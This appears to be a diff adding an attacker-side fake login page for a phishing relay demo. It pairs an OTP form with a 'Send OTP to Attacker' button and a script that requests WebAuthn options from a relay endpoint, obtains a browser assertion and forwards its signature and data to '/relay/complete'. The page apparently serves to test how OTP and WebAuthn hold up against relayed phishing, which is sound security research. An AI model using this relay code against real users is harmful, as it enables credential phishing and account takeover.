@@ -1,0 +1,82 @@
+<!doctype html>
+<html>
+<head><meta charset="utf-8"><title>Fake Login (Attacker)</title></head>
+<body>
+  <h1>Fake Login (Attacker)</h1>
+
+  <section>
+    <h2>OTP Relay Test</h2>
+    <label>Username: <input id="otpUser" value="alice"></label><br>
+    <label>OTP: <input id="otp"></label>
+    <button onclick="sendOtp()">Send OTP to Attacker</button>
+    <pre id="otpResult"></pre>
+  </section>
+
+  <section>
+    <h2>WebAuthn Relay Test</h2>
+    <label>Username: <input id="webauthnUser" value="alice"></label>
+    <button id="getAssertion">Get Assertion (Phish)</button>
+    <pre id="webauthnResult"></pre>
+  </section>
+
+  <script src="/static/attacker.js"></script>
+  <script src="/static/cbor.js"></script>
+  <script>
+    async function fetchOptionsCbor(username){
+    const res = await fetch(`/relay/authenticate?username=${encodeURIComponent(username)}`, {
+        headers: { "Accept": "application/cbor" },
+        credentials: "same-origin",
+    });
+    if(!res.ok){
+        throw new Error(`authenticate begin failed: ${res.status} ${await res.text().catch(()=> "")}`);
+    }
+    const buf = await res.arrayBuffer();
+    return window.CBOR.decode(buf);   // { publicKey: {...bytes... as Uint8Array} }
+    }
+
+    function toUint8(v){
+    if (v instanceof ArrayBuffer) return new Uint8Array(v);
+    if (ArrayBuffer.isView(v)) return new Uint8Array(v.buffer, v.byteOffset, v.byteLength);
+    return v;
+    }
+
+    document.getElementById('getAssertion').addEventListener('click', async ()=>{
+    const username = document.getElementById('webauthnUser').value.trim();
+    const out = document.getElementById('webauthnResult');
+    try{
+        const options = await fetchOptionsCbor(username);
+        const pk = options.publicKey || options;
+        const publicKey = {
+        ...pk,
+        challenge: toUint8(pk.challenge),
+        allowCredentials: (pk.allowCredentials || []).map(c=>({...c, id: toUint8(c.id)})),
+        };
+
+        const assertion = await navigator.credentials.get({ publicKey });
+        if(!assertion) throw new Error("navigator.credentials.get returned null");
+
+        const payload = {
+        credentialId: toUint8(assertion.rawId),
+        clientDataJSON: toUint8(assertion.response.clientDataJSON),
+        authenticatorData: toUint8(assertion.response.authenticatorData),
+        signature: toUint8(assertion.response.signature),
+        };
+
+        const cborBody = window.CBOR.encode(payload);
+        const fwd = await fetch('/relay/complete', {
+        method:'POST',
+        headers:{ 'Content-Type':'application/cbor', 'Accept': 'application/cbor' },
+        body: cborBody,
+        credentials: "same-origin",
+        });
+
+        // display status for demo
+        out.textContent = `forwarded: ${fwd.status}`;
+    }catch(e){
+        console.error(e);
+        out.textContent = String(e);
+    }
+    });
+  </script>
+</body>
+</html>
